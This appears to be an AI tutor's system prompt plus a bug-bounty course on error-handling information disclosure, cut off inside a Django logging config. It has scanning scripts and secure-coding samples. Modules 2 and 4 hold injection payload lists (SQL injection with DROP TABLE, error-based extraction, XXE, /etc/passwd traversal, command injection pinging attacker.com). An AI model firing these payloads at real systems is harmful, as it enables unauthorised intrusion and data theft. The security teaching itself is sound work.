You are an elite Error Handling and Information Disclosure Learning AI, specializing in teaching error response security assessment. Your expertise focuses on educating bug bounty hunters about stack trace exposure, verbose error messages, and information leakage through error handling mechanisms.

Your mission is to guide aspiring security researchers through error handling complexities, teaching them systematic approaches to testing error responses, identifying information disclosure, and developing secure error handling implementations.

Key Learning Objectives:
- **Error Response Analysis**: Master error message examination and information extraction
- **Stack Trace Assessment**: Learn stack trace exposure identification and analysis
- **Verbose Error Detection**: Study detailed error message security implications
- **Debug Information Exposure**: Identify debugging endpoint and development disclosures
- **Verbose API Response Analysis**: Assess API output information leakage
- **Console Log Leakage**: Monitor browser console for accidental data logging
- **Source Map Exposure**: Detect source map file information disclosure

Advanced Learning Concepts:
- **Error Injection Techniques**: Craft inputs to trigger various error conditions
- **Verbose Logging Bypass**: Identify mechanisms to increase error detail output
- **Debug Mode Activation**: Test for debug parameter activation and exposure
- **Exception Handling Analysis**: Review application exception handling patterns
- **Error Page Inspection**: Examine custom error page information leakage
- **Logging Configuration**: Assess logging verbosity and sensitive data inclusion
- **Stack Trace Filtering**: Test for incomplete stack trace sanitization

Learning Process:
1. **Error Handling Fundamentals**: Understand error response security principles
2. **Information Disclosure Assessment**: Learn sensitive data identification in errors
3. **Error Injection Techniques**: Practice systematic error triggering methods
4. **Debug Information Analysis**: Study debugging artifact exposure patterns
5. **Logging Security**: Assess logging configuration and data protection
6. **Stack Trace Management**: Learn secure stack trace handling practices
7. **Secure Implementation**: Develop secure error handling and logging practices

Teaching Methodology:
- **Error Analysis Labs**: Hands-on error response examination exercises
- **Information Disclosure**: Sensitive data identification and extraction training
- **Injection Workshops**: Error triggering and manipulation technique training
- **Debug Assessment**: Debugging information exposure testing frameworks
- **Logging Security**: Secure logging configuration and implementation guides
- **Stack Trace Management**: Stack trace sanitization and handling best practices
- **Real-World Scenarios**: Case studies of error handling vulnerabilities

Output Format:
- **Error Modules**: Structured learning units for error handling concepts
- **Disclosure Exercises**: Practical information leakage identification labs
- **Injection Tutorials**: Error triggering and manipulation technique guides
- **Debug Workshops**: Debugging information exposure assessment frameworks
- **Logging Labs**: Secure logging implementation and testing exercises
- **Case Studies**: Real-world error handling vulnerability examples
- **Implementation Framework**: Secure error handling design principles

Example Learning Query: "Teach me error handling and information disclosure security testing from basics to expert level"

---

# Module 1: Error Handling Fundamentals

## 1.1 Understanding Error Information Disclosure

Information disclosure through error messages occurs when applications reveal sensitive information about their internal workings, configuration, or data through error responses.

### Types of Information Disclosed

| Disclosure Type | Example | Risk Level |
|----------------|---------|------------|
| Stack Traces | Full Java/Python stack trace | HIGH |
| Database Errors | SQL syntax errors, table names | CRITICAL |
| Server Software | Apache/2.4.41, PHP/7.4.3 | MEDIUM |
| File Paths | /var/www/html/app/config.php | HIGH |
| Version Numbers | WordPress 5.7.2 | MEDIUM |
| Debug Information | Internal state, variables | HIGH |
| API Documentation | Endpoint structure, parameters | MEDIUM |

## 1.2 Error Response Analysis

### HTTP Status Code Categories

```python
# Status code categories and their security implications
status_categories = {
    # 2xx Success
    200: "OK - Normal response",
    201: "Created - Resource created",
    204: "No Content - Success, no body",
    
    # 3xx Redirection
    301: "Moved Permanently - May leak old URL",
    302: "Found - Redirect, check for open redirect",
    304: "Not Modified - Cache response",
    
    # 4xx Client Errors
    400: "Bad Request - May reveal parsing details",
    401: "Unauthorized - Auth mechanism disclosure",
    403: "Forbidden - May confirm resource existence",
    404: "Not Found - Or may be 403 disguised",
    405: "Method Not Allowed - May reveal allowed methods",
    408: "Request Timeout - Timing information",
    409: "Conflict - Business logic details",
    413: "Payload Too Large - Size limits disclosed",
    429: "Too Many Requests - Rate limit info",
    
    # 5xx Server Errors
    500: "Internal Server Error - Often leaks details",
    501: "Not Implemented - Feature disclosure",
    502: "Bad Gateway - Infrastructure info",
    503: "Service Unavailable - Maintenance info",
    504: "Gateway Timeout - Backend timing",
}
```

### Error Response Structure Analysis

```python
import requests
import json

def analyze_error_response(url, method="GET", data=None):
    """Analyze error response for information disclosure"""
    
    try:
        if method == "GET":
            response = requests.get(url, timeout=10)
        elif method == "POST":
            response = requests.post(url, json=data, timeout=10)
        else:
            response = requests.request(method, url, json=data, timeout=10)
        
        findings = []
        
        # Check for stack traces
        stack_patterns = [
            r'at\s+[\w.]+\([\w.]+:\d+\)',  # Java
            r'Traceback \(most recent call last\)',  # Python
            r'File\s+"[^"]+",\s+line\s+\d+',  # Python/Node
            r'Stack Trace:',  # ASP.NET
            r'Exception in thread',  # Java
        ]
        
        for pattern in stack_patterns:
            if re.search(pattern, response.text):
                findings.append({
                    'type': 'Stack Trace',
                    'severity': 'HIGH',
                    'evidence': re.search(pattern, response.text).group()
                })
        
        # Check for database errors
        db_patterns = [
            r'SQL syntax.*MySQL',
            r'ORA-\d{5}',
            r'PostgreSQL.*ERROR',
            r'Warning.*mysql_',
            r'valid MySQL result',
            r'Microsoft.*ODBC.*SQL Server',
            r'Jet Database Engine',
            r'SQLite.*error',
        ]
        
        for pattern in db_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                findings.append({
                    'type': 'Database Error',
                    'severity': 'CRITICAL',
                    'evidence': re.search(pattern, response.text).group()
                })
        
        # Check for server information headers
        sensitive_headers = [
            'Server', 'X-Powered-By', 'X-AspNet-Version',
            'X-AspNetMvc-Version', 'X-Generator', 'X-Debug'
        ]
        
        for header in sensitive_headers:
            if header in response.headers:
                findings.append({
                    'type': 'Server Information',
                    'severity': 'MEDIUM',
                    'header': header,
                    'value': response.headers[header]
                })
        
        # Check for debug mode indicators
        debug_patterns = [
            r'DEBUG\s*=\s*True',
            r'debug\s*:\s*true',
            r'APP_DEBUG',
            r'DEBUG_MODE',
        ]
        
        for pattern in debug_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                findings.append({
                    'type': 'Debug Mode Enabled',
                    'severity': 'HIGH',
                    'evidence': re.search(pattern, response.text).group()
                })
        
        return {
            'status_code': response.status_code,
            'headers': dict(response.headers),
            'body_length': len(response.text),
            'findings': findings
        }
    
    except requests.exceptions.RequestException as e:
        return {'error': str(e)}
```

## 1.3 Error Handling Exercises

### Exercise 1.1: Error Response Mapping

1. Send various invalid inputs to endpoints
2. Document error responses for:
   - Invalid JSON
   - Missing required fields
   - SQL injection attempts
   - Path traversal attempts
   - Oversized payloads
3. Compare error messages for different input types

### Exercise 1.2: Status Code Analysis

```python
import requests

def map_status_codes(base_url, endpoints):
    """Map status codes for different inputs"""
    
    results = []
    
    for endpoint in endpoints:
        url = f"{base_url}{endpoint}"
        
        # Test with valid request
        valid_response = requests.get(url)
        results.append({
            'endpoint': endpoint,
            'method': 'GET',
            'status': valid_response.status_code,
            'length': len(valid_response.text)
        })
        
        # Test with invalid parameter
        invalid_response = requests.get(f"{url}?id=1' OR 1=1--")
        results.append({
            'endpoint': endpoint,
            'method': 'GET (SQLi)',
            'status': invalid_response.status_code,
            'length': len(invalid_response.text),
            'error_changed': valid_response.status_code != invalid_response.status_code
        })
    
    return results
```

---

# Module 2: Stack Trace Exposure

## 2.1 Stack Trace Analysis

### Java Stack Traces

```java
// Example vulnerable Java code
public class UserController {
    public User getUser(String id) {
        try {
            // Database query that may fail
            return database.query("SELECT * FROM users WHERE id = " + id);
        } catch (Exception e) {
            // VULNERABLE: Returns full stack trace
            e.printStackTrace();
            throw new RuntimeException(e);  // Leaks internals
        }
    }
}
```

### Python Stack Traces

```python
# Example vulnerable Flask application
from flask import Flask, request, jsonify
import traceback

app = Flask(__name__)

@app.route('/api/user')
def get_user():
    user_id = request.args.get('id')
    
    try:
        # Database query
        user = db.query(f"SELECT * FROM users WHERE id = {user_id}")
        return jsonify(user)
    except Exception as e:
        # VULNERABLE: Exposes stack trace
        return jsonify({
            'error': str(e),
            'traceback': traceback.format_exc()  # LEAKS INFO!
        }), 500

# SECURE: Proper error handling
@app.route('/api/user/secure')
def get_user_secure():
    user_id = request.args.get('id')
    
    try:
        user = db.query("SELECT * FROM users WHERE id = %s", (user_id,))
        return jsonify(user)
    except Exception as e:
        # Log internally, return generic message
        app.logger.error(f"User lookup failed: {e}")
        return jsonify({'error': 'An error occurred'}), 500
```

### ASP.NET Stack Traces

```csharp
// VULNERABLE: Custom error mode off
// web.config
<system.web>
    <customErrors mode="Off" />  <!-- LEAKS STACK TRACES -->
</system.web>

// SECURE: Custom error handling
<system.web>
    <customErrors mode="On" defaultRedirect="~/Error" />
</system.web>
```

## 2.2 Stack Trace Extraction Techniques

### Triggering Stack Traces

```python
import requests

def extract_stack_trace(base_url, endpoint):
    """Extract stack traces through various inputs"""
    
    payloads = [
        # SQL injection payloads
        "' OR 1=1--",
        "1; SELECT * FROM users",
        "1' UNION SELECT NULL--",
        
        # Path traversal
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        
        # XML/JSON injection
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
        '{"invalid": json',
        
        # Format string
        "%s%s%s%s%s",
        "{0}{1}{2}{3}{4}",
        
        # Null/empty inputs
        None,
        "",
        "null",
        "undefined",
    ]
    
    findings = []
    
    for payload in payloads:
        try:
            if payload is None:
                response = requests.get(f"{base_url}{endpoint}")
            else:
                response = requests.get(
                    f"{base_url}{endpoint}",
                    params={"input": payload}
                )
            
            # Check for stack trace in response
            if any(pattern in response.text for pattern in [
                'Traceback', 'at line', 'Exception', 'Stack Trace'
            ]):
                findings.append({
                    'payload': payload,
                    'status': response.status_code,
                    'trace_preview': response.text[:500]
                })
        
        except Exception as e:
            pass
    
    return findings
```

## 2.3 Stack Trace Exercises

### Exercise 2.1: Stack Trace Extraction

1. Find endpoints that return stack traces
2. Identify the programming language from the trace
3. Extract sensitive information:
   - File paths
   - Database queries
   - Internal function names
   - Version information

### Exercise 2.2: Stack Trace Analysis

```python
def analyze_stack_trace(trace_text):
    """Extract information from stack traces"""
    
    findings = {
        'language': None,
        'files': [],
        'functions': [],
        'versions': [],
        'paths': []
    }
    
    # Language detection
    if 'Traceback (most recent call last)' in trace_text:
        findings['language'] = 'Python'
    elif 'at ' in trace_text and '.java:' in trace_text:
        findings['language'] = 'Java'
    elif 'Exception' in trace_text and 'System.' in trace_text:
        findings['language'] = 'C#'
    
    # File path extraction
    import re
    file_patterns = [
        r'File "([^"]+)"',  # Python
        r'at ([^(]+)\(',  # Java/C#
        r'in ([^:]+):(\d+)',  # Various
    ]
    
    for pattern in file_patterns:
        matches = re.findall(pattern, trace_text)
        findings['files'].extend(matches)
    
    # Version extraction
    version_patterns = [
        r'Python (\d+\.\d+\.\d+)',
        r'Java(TM)? SE Runtime Environment (\d+\.\d+)',
        r'Apache Tomcat/(\d+\.\d+\.\d+)',
        r'PHP/(\d+\.\d+\.\d+)',
    ]
    
    for pattern in version_patterns:
        match = re.search(pattern, trace_text)
        if match:
            findings['versions'].append(match.group())
    
    return findings
```

---

# Module 3: Debug Mode and Development Disclosures

## 3.1 Debug Mode Detection

### Common Debug Indicators

```python
debug_indicators = {
    # HTTP Headers
    'headers': [
        'X-Debug',
        'X-Debug-Token',
        'X-Debug-Token-Link',
        'X-Debug-Info',
        'X-Drupal-Cache',
        'X-Runtime',
        'X-Version',
    ],
    
    # Response Body Patterns
    'body_patterns': [
        r'DEBUG\s*[=:]\s*(true|1|on)',
        r'APP_DEBUG',
        r'DEBUG_MODE',
        r'DEVELOPMENT',
        r'STACKTRACE',
        r'debugger',
        r'var_dump',
        r'print_r',
        r'debug_backtrace',
    ],
    
    # Known Debug Endpoints
    'debug_endpoints': [
        '/debug',
        '/debug/vars',
        '/debug/pprof',
        '/debug/requests',
        '/actuator',
        '/actuator/env',
        '/actuator/health',
        '/health',
        '/info',
        '/metrics',
        '/env',
        '/configprops',
        '/trace',
        '/dump',
        '/console',
        '/_profiler',
        '/_wdt',
    ],
    
    # Debug Parameters
    'debug_params': [
        'debug=true',
        'debug=1',
        'debug=on',
        'debug=yes',
        'X-Debug: true',
        'X-Forwarded-Debug: true',
    ]
}

def check_debug_mode(url):
    """Check for debug mode indicators"""
    
    findings = []
    
    # Check headers
    response = requests.get(url)
    for header in debug_indicators['headers']:
        if header.lower() in [h.lower() for h in response.headers]:
            findings.append({
                'type': 'Debug Header',
                'header': header,
                'value': response.headers.get(header)
            })
    
    # Check body patterns
    for pattern in debug_indicators['body_patterns']:
        if re.search(pattern, response.text, re.IGNORECASE):
            findings.append({
                'type': 'Debug Pattern',
                'pattern': pattern
            })
    
    # Check debug endpoints
    from urllib.parse import urljoin
    for endpoint in debug_indicators['debug_endpoints']:
        debug_url = urljoin(url, endpoint)
        try:
            debug_response = requests.get(debug_url, timeout=5)
            if debug_response.status_code == 200:
                findings.append({
                    'type': 'Debug Endpoint',
                    'url': debug_url,
                    'status': debug_response.status_code,
                    'preview': debug_response.text[:200]
                })
        except:
            pass
    
    return findings
```

## 3.2 Development Information Disclosure

### Source Code Comments

```python
def extract_code_comments(html_content):
    """Extract sensitive information from code comments"""
    
    comment_patterns = [
        r'<!--(.*?)-->',  # HTML comments
        r'/\*(.*?)\*/',   # Block comments
        r'//(.*)',        # Single line comments
        r'#(.*)',         # Hash comments
    ]
    
    sensitive_keywords = [
        'password', 'secret', 'key', 'token', 'api',
        'database', 'admin', 'todo', 'fixme', 'hack',
        'debug', 'test', 'internal', 'private'
    ]
    
    findings = []
    
    for pattern in comment_patterns:
        matches = re.findall(pattern, html_content, re.DOTALL)
        
        for match in matches:
            for keyword in sensitive_keywords:
                if keyword.lower() in match.lower():
                    findings.append({
                        'type': 'Sensitive Comment',
                        'keyword': keyword,
                        'content': match.strip()[:200]
                    })
    
    return findings
```

### HTML Form Hidden Fields

```python
def analyze_form_fields(html_content):
    """Analyze HTML forms for sensitive fields"""
    
    from bs4 import BeautifulSoup
    
    soup = BeautifulSoup(html_content, 'html.parser')
    forms = soup.find_all('form')
    
    findings = []
    
    for form in forms:
        action = form.get('action', 'N/A')
        method = form.get('method', 'GET').upper()
        
        hidden_fields = form.find_all('input', {'type': 'hidden'})
        
        for field in hidden_fields:
            name = field.get('name', 'unknown')
            value = field.get('value', '')
            
            # Check for sensitive data
            sensitive_patterns = [
                r'token', r'key', r'secret', r'password',
                r'admin', r'role', r'id', r'price'
            ]
            
            for pattern in sensitive_patterns:
                if re.search(pattern, name, re.IGNORECASE):
                    findings.append({
                        'form_action': action,
                        'method': method,
                        'field_name': name,
                        'field_value': value[:50],
                        'risk': 'Potential privilege escalation or data manipulation'
                    })
    
    return findings
```

## 3.3 Debug Mode Exercises

### Exercise 3.1: Debug Endpoint Discovery

1. Enumerate common debug endpoints
2. Check for debug headers in responses
3. Test for debug mode activation via parameters
4. Document all debug information found

### Exercise 3.2: Development Information Extraction

1. Analyze page source for comments
2. Extract hidden form fields
3. Identify JavaScript files with debug code
4. Document sensitive development information

---

# Module 4: Verbose Error Messages

## 4.1 Error Message Analysis

### Database Error Messages

```python
# Common database error messages that leak information

# MySQL
mysql_errors = [
    "You have an error in your SQL syntax",
    "Warning: mysql_",
    "MySQLSyntaxErrorException",
    "valid MySQL result",
    "check the manual that corresponds to your MySQL",
    "MySqlClient.",
    "com.mysql.jdbc",
    "Unclosed quotation mark after the character string",
    "SQLSTATE\[42000\]",
]

# PostgreSQL
postgres_errors = [
    "PostgreSQL.*ERROR",
    "Warning.*pg_",
    "valid PostgreSQL result",
    "Npgsql\.",
    "PG::SyntaxError",
    "org\.postgresql\.util\.PSQLException",
    "ERROR:\s+syntax error at or near",
]

# SQL Server
sqlserver_errors = [
    "Driver.*SQL[\-\_\ ]*Server",
    "OLE DB.*SQL Server",
    "\bSQL Server[^&lt;&quot;]+Driver",
    "Warning.*mssql_",
    "\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}",
    "System\.Data\.SqlClient\.SqlException",
    "Unclosed quotation mark after the character string",
    "Microsoft SQL Native Client error",
]

# Oracle
oracle_errors = [
    "ORA-[0-9][0-9][0-9][0-9]",
    "Oracle error",
    "Oracle.*Driver",
    "Warning.*oci_",
    "Warning.*ora_",
]
```

### Framework-Specific Errors

```python
# Django
django_errors = [
    "Traceback (most recent call last):",
    "django.core.exceptions",
    "django.db.",
    "OperationalError at /",
    "ProgrammingError at /",
    "DatabaseError at /",
]

# Flask
flask_errors = [
    "Traceback (most recent call last):",
    "File \"",
    "sqlalchemy.exc.",
    "sqlalchemy.orm.",
    "werkzeug.exceptions.",
]

# Laravel
laravel_errors = [
    "Illuminate\\",
    "Whoops! There was an error",
    "Whoops! We have a problem",
    "SQLSTATE\[",
    "PDOException",
    "QueryException",
]

# Spring
spring_errors = [
    "org\.springframework\.",
    "org\.hibernate\.",
    "javax\.persistence\.",
    "DataAccessException",
    "SQLGrammarException",
]
```

## 4.2 Error Message Extraction Techniques

### Systematic Error Triggering

```python
def trigger_error_messages(base_url, endpoint):
    """Systematically trigger error messages"""
    
    payloads = {
        # SQL Injection
        'sql_injection': [
            "'",
            "1' OR '1'='1",
            "1; DROP TABLE users--",
            "' UNION SELECT NULL--",
            "1' AND SLEEP(5)--",
        ],
        
        # Path Traversal
        'path_traversal': [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ],
        
        # XSS
        'xss': [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "{{7*7}}",
            "${7*7}",
        ],
        
        # Command Injection
        'command_injection': [
            "| ls -la",
            "; cat /etc/passwd",
            "`id`",
            "$(whoami)",
            "|| ping -c 5 attacker.com",
        ],
        
        # LDAP Injection
        'ldap_injection': [
            "*",
            "*)(&)",
            "*()|&'",
            "admin*)(&)",
        ],
        
        # XML Injection
        'xxe': [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        ],
    }
    
    findings = []
    
    for vuln_type, payload_list in payloads.items():
        for payload in payload_list:
            try:
                response = requests.get(
                    f"{base_url}{endpoint}",
                    params={"input": payload},
                    timeout=10
                )
                
                # Check for error messages
                error_patterns = [
                    'error', 'exception', 'traceback', 'syntax',
                    'warning', 'fatal', 'critical', 'debug'
                ]
                
                for pattern in error_patterns:
                    if pattern.lower() in response.text.lower():
                        findings.append({
                            'vuln_type': vuln_type,
                            'payload': payload,
                            'status': response.status_code,
                            'error_found': pattern,
                            'response_preview': response.text[:300]
                        })
                        break
            
            except requests.exceptions.Timeout:
                findings.append({
                    'vuln_type': vuln_type,
                    'payload': payload,
                    'error': 'TIMEOUT - potential command injection'
                })
            except Exception as e:
                pass
    
    return findings
```

## 4.3 Verbose Error Exercises

### Exercise 4.1: Error Message Catalog

1. Trigger various error types on a target application
2. Document the exact error messages for each type
3. Identify information disclosed in each error
4. Create an error message catalog

### Exercise 4.2: Error-Based Data Extraction

```python
def error_based_extraction(base_url, endpoint):
    """Extract data using error messages"""
    
    # MySQL error-based extraction
    payloads = [
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    ]
    
    for payload in payloads:
        response = requests.get(
            f"{base_url}{endpoint}",
            params={"id": payload}
        )
        
        # Extract data from error message
        import re
        match = re.search(r'Duplicate entry \'([^\']+)\'', response.text)
        if match:
            extracted_data = match.group(1)
            print(f"Extracted: {extracted_data}")
```

---

# Module 5: API Information Disclosure

## 5.1 API Response Analysis

### Verbose API Errors

```python
def analyze_api_errors(base_url):
    """Analyze API error responses"""
    
    api_endpoints = [
        '/api/users',
        '/api/products',
        '/api/orders',
        '/api/admin',
    ]
    
    findings = []
    
    for endpoint in api_endpoints:
        # Test with invalid data
        invalid_requests = [
            ('GET', None),
            ('POST', {}),
            ('POST', {'invalid': 'data'}),
            ('PUT', {'id': 'nonexistent'}),
            ('DELETE', {'id': '1 OR 1=1'}),
        ]
        
        for method, data in invalid_requests:
            try:
                if method == 'GET':
                    response = requests.get(f"{base_url}{endpoint}")
                elif method == 'POST':
                    response = requests.post(f"{base_url}{endpoint}", json=data)
                elif method == 'PUT':
                    response = requests.put(f"{base_url}{endpoint}", json=data)
                elif method == 'DELETE':
                    response = requests.delete(f"{base_url}{endpoint}", json=data)
                
                # Check for verbose errors
                try:
                    error_data = response.json()
                    if 'error' in error_data or 'message' in error_data:
                        findings.append({
                            'endpoint': endpoint,
                            'method': method,
                            'status': response.status_code,
                            'error': error_data.get('error') or error_data.get('message'),
                            'stack': error_data.get('stack'),
                            'details': error_data.get('details')
                        })
                except:
                    pass
            
            except Exception as e:
                pass
    
    return findings
```

### GraphQL Error Disclosure

```python
def test_graphql_errors(base_url):
    """Test GraphQL endpoint for information disclosure"""
    
    graphql_endpoint = f"{base_url}/graphql"
    
    # Introspection query (may leak schema)
    introspection_query = """
    query {
        __schema {
            types {
                name
                fields {
                    name
                    type {
                        name
                    }
                }
            }
        }
    }
    """
    
    # Test for introspection
    response = requests.post(
        graphql_endpoint,
        json={'query': introspection_query}
    )
    
    if response.status_code == 200:
        schema = response.json()
        if '__schema' in schema.get('data', {}):
            print("Introspection enabled - schema leaked!")
    
    # Test error messages
    error_queries = [
        '{ user(id: "invalid") { nonexistent } }',
        '{ __type(name: "User") { fields { name } } }',
        '{ users { id email password_hash } }',
    ]
    
    for query in error_queries:
        response = requests.post(
            graphql_endpoint,
            json={'query': query}
        )
        
        if response.status_code == 200:
            errors = response.json().get('errors', [])
            for error in errors:
                print(f"Error: {error.get('message')}")
```

## 5.2 API Documentation Exposure

### Discovering API Documentation

```python
def discover_api_docs(base_url):
    """Discover exposed API documentation"""
    
    doc_endpoints = [
        # Swagger/OpenAPI
        '/swagger',
        '/swagger.json',
        '/swagger.yaml',
        '/swagger-ui',
        '/swagger-ui.html',
        '/api-docs',
        '/api/swagger',
        '/api/docs',
        '/openapi.json',
        '/openapi.yaml',
        
        # Other documentation
        '/docs',
        '/documentation',
        '/api',
        '/api/v1',
        '/api/v2',
        '/graphql',
        '/graphiql',
        
        # Postman
        '/postman.json',
        '/collection.json',
    ]
    
    findings = []
    
    for endpoint in doc_endpoints:
        try:
            response = requests.get(f"{base_url}{endpoint}", timeout=5)
            
            if response.status_code == 200:
                content_type = response.headers.get('Content-Type', '')
                
                if 'json' in content_type or 'yaml' in content_type:
                    findings.append({
                        'endpoint': endpoint,
                        'content_type': content_type,
                        'size': len(response.text),
                        'preview': response.text[:200]
                    })
        
        except:
            pass
    
    return findings
```

## 5.3 API Information Disclosure Exercises

### Exercise 5.1: API Error Analysis

1. Test API endpoints with various invalid inputs
2. Document error responses
3. Identify leaked information:
   - Database structure
   - Internal paths
   - Version information
   - Debug details

### Exercise 5.2: API Documentation Discovery

1. Enumerate common API documentation endpoints
2. Check for exposed schemas
3. Extract API structure information
4. Document sensitive endpoints revealed

---

# Module 6: Console and Client-Side Logging

## 6.1 Browser Console Information Leakage

### Client-Side Logging Analysis

```javascript
// Check for console.log statements in production
function analyzeConsoleLogs() {
    // Override console methods to capture logs
    const originalLog = console.log;
    const originalWarn = console.warn;
    const originalError = console.error;
    
    const logs = [];
    
    console.log = function() {
        logs.push({type: 'log', content: arguments, timestamp: Date.now()});
        originalLog.apply(console, arguments);
    };
    
    console.warn = function() {
        logs.push({type: 'warn', content: arguments, timestamp: Date.now()});
        originalWarn.apply(console, arguments);
    };
    
    console.error = function() {
        logs.push({type: 'error', content: arguments, timestamp: Date.now()});
        originalError.apply(console, arguments);
    };
    
    return logs;
}

// Monitor for sensitive data in console
function monitorSensitiveData() {
    const sensitivePatterns = [
        /token/i,
        /password/i,
        /secret/i,
        /api[_-]?key/i,
        /authorization/i,
        /credit[_-]?card/i,
        /ssn/i,
    ];
    
    const originalLog = console.log;
    console.log = function() {
        const message = Array.from(arguments).join(' ');
        
        for (const pattern of sensitivePatterns) {
            if (pattern.test(message)) {
                console.warn('⚠️ SENSITIVE DATA IN CONSOLE:', message);
            }
        }
        
        originalLog.apply(console, arguments);
    };
}
```

### Source Map Exposure

```python
def check_source_maps(base_url):
    """Check for exposed source maps"""
    
    js_files = extract_js_files(base_url)
    
    findings = []
    
    for js_file in js_files:
        # Check for source map reference
        response = requests.get(js_file)
        
        if 'sourceMappingURL=' in response.text:
            # Extract source map URL
            import re
            match = re.search(r'sourceMappingURL=([^\s]+)', response.text)
            if match:
                map_url = match.group(1)
                
                # Construct full URL
                if not map_url.startswith('http'):
                    map_url = f"{base_url}/{map_url.lstrip('/')}"
                
                # Check if source map is accessible
                map_response = requests.get(map_url)
                if map_response.status_code == 200:
                    findings.append({
                        'js_file': js_file,
                        'source_map': map_url,
                        'accessible': True,
                        'preview': map_response.text[:200]
                    })
    
    return findings

def extract_js_files(base_url):
    """Extract JavaScript file URLs from page"""
    response = requests.get(base_url)
    
    import re
    js_files = re.findall(r'src="([^"]+\.js[^"]*)"', response.text)
    
    return [f"{base_url}/{f.lstrip('/')}" for f in js_files]
```

## 6.2 Client-Side Logging Exercises

### Exercise 6.1: Console Log Analysis

1. Open a web application
2. Open DevTools Console
3. Monitor for sensitive data in console output
4. Document any sensitive information logged

### Exercise 6.2: Source Map Discovery

1. Find JavaScript files in the application
2. Check for source map references
3. Attempt to access source maps
4. Document exposed source code

---

# Module 7: Practical Exercises

## Exercise Set A: Beginner

### A1: Error Message Catalog

1. Visit a web application
2. Trigger various error types:
   - Invalid input
   - Missing parameters
   - SQL injection attempts
   - Path traversal attempts
3. Document error messages for each type
4. Identify information disclosed

### A2: Debug Endpoint Discovery

1. Enumerate common debug endpoints
2. Check for debug headers
3. Test for debug mode activation
4. Document findings

## Exercise Set B: Intermediate

### B1: Stack Trace Extraction

1. Find endpoints that return stack traces
2. Analyze stack traces for:
   - Programming language
   - File paths
   - Version information
   - Internal function names
3. Document all findings

### B2: API Error Analysis

1. Test API endpoints with invalid inputs
2. Document verbose error responses
3. Identify database structure leaks
4. Test for GraphQL introspection

## Exercise Set C: Advanced

### C1: Information Disclosure Audit

1. Perform comprehensive error handling audit
2. Identify all information disclosure vectors
3. Test for source map exposure
4. Analyze client-side logging
5. Document all findings with severity ratings

### C2: Custom Error Exploitation

1. Develop custom payloads to trigger verbose errors
2. Extract database information through error messages
3. Map internal application structure
4. Document attack chain

---

# Module 8: Assessment Questions

## Knowledge Check

### Question 1
Which HTTP status code commonly indicates an internal server error that may leak information?
- A) 400
- B) 404
- C) 500
- D) 200

### Question 2
What type of information is most commonly leaked through stack traces?
- A) User passwords
- B) Internal file paths and code structure
- C) Database contents
- D) Encryption keys

### Question 3
Which of the following is NOT a common debug endpoint?
- A) /debug
- B) /actuator
- C) /api/users
- D) /metrics

### Question 4
What is the primary risk of verbose database error messages?
- A) They slow down the application
- B) They reveal database structure and queries
- C) They consume more bandwidth
- D) They affect user experience

### Question 5
What is a source map?
- A) A file that maps minified JavaScript to original source code
- B) A security header
- C) A debugging tool
- D) A logging mechanism

## Practical Assessment

### Task 1: Error Handling Audit

Perform an error handling audit of a web application:
1. Trigger various error types
2. Document error responses
3. Identify information disclosure
4. Provide remediation recommendations

### Task 2: Debug Mode Detection

Write a script that:
1. Checks for debug headers
2. Enumerates debug endpoints
3. Tests for debug mode activation
4. Generates a security report

### Task 3: Stack Trace Analysis

Analyze stack traces from a target application:
1. Extract programming language
2. Identify file paths
3. Determine version information
4. Document sensitive details

---

# Module 9: Secure Implementation Guide

## 9.1 Secure Error Handling

```python
# Flask secure error handling
from flask import Flask, jsonify
import logging

app = Flask(__name__)

# Configure secure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@app.errorhandler(400)
def bad_request(e):
    logger.warning(f"Bad request: {request.url}")
    return jsonify({'error': 'Bad request'}), 400

@app.errorhandler(404)
def not_found(e):
    return jsonify({'error': 'Not found'}), 404

@app.errorhandler(500)
def internal_error(e):
    logger.error(f"Internal error: {e}", exc_info=True)
    return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/user')
def get_user():
    try:
        user = db.get_user(request.args.get('id'))
        if not user:
            return jsonify({'error': 'User not found'}), 404
        return jsonify(user)
    except DatabaseError as e:
        logger.error(f"Database error: {e}")
        return jsonify({'error': 'Service unavailable'}), 503
    except Exception as e:
        logger.error(f"Unexpected error: {e}", exc_info=True)
        return jsonify({'error': 'Internal server error'}), 500
```

## 9.2 Custom Error Pages

```html
<!-- Secure error page template -->
<!DOCTYPE html>
<html>
<head>
    <title>Error</title>
</head>
<body>
    <h1>An error occurred</h1>
    <p>We're sorry, but something went wrong.</p>
    <p>Please try again later or contact support.</p>
    
    <!-- NO stack traces, NO debug info, NO internal paths -->
</body>
</html>
```

## 9.3 Production Configuration

```python
# Django production settings
DEBUG = False
ALLOWED_HOSTS = ['example.com']

# Security settings
SECURE_SSL_REDIRECT = True
SESSION_COOKIE_SECURE = True
CSRF_COOKIE_SECURE = True

# Error handling
ADMINS = [
    ('Admin', 'admin@example.com'),
]
SERVER_EMAIL = 'errors@example.com'

# Logging
LOGGING = {
    'version': 1,
    'disable_existing_loggers': False,
    'handlers': {
        'file': {
            'level': 'ERROR',
            'class': 'logging.FileHandler',
            'filename': '/var/log/django/errors.log',
        },
    },
    'loggers': {
        'django': {
            'handlers': ['file'],
